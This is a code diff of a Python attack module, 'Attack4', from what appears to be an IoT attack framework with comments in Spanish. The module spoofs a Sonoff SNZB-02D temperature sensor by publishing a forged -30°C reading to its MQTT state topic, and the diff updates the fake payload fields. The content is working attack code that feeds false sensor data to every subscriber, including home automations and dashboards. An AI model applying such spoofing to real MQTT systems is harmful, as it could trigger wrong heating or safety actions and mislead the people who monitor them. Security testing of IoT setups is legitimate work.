@@ -4,21 +4,26 @@ from config import ATTACK4_INTERVAL, MQTT_TEMP_STATE_TOPIC
 from mqtt_service import publish_to_topic
 from attacks.base import BaseAttack
 
-# Payload basado en el estado real del sensor (Sonoff SNZB-02P).
+# Payload basado en el estado real del sensor (Sonoff SNZB-02D).
 # Se publica en el topic de estado (sin /set) para spoofear la lectura
 # que ven todos los suscriptores, incluyendo automatizaciones y dashboards.
 _SPOOF_PAYLOAD = {
     'battery': 100,
-    'humidity': 43.8,
+    'comfort_humidity_max': 60,
+    'comfort_humidity_min': 40,
+    'comfort_temperature_max': 27,
+    'comfort_temperature_min': 19,
+    'humidity': 42.4,
     'humidity_calibration': 0,
     'linkquality': 255,
     'temperature': -30,
     'temperature_calibration': 0,
+    'temperature_units': 'celsius',
 }
 
 
 class Attack4(BaseAttack):
-    """Ataque 4: Spoofea la temperatura del sensor SNZB-02P a -30°C.
+    """Ataque 4: Spoofea la temperatura del sensor SNZB-02D a -30°C.
 
     Publica directamente en el topic de estado del sensor (sin /set)
     sobreescribiendo la lectura real con un valor falso de -30°C.
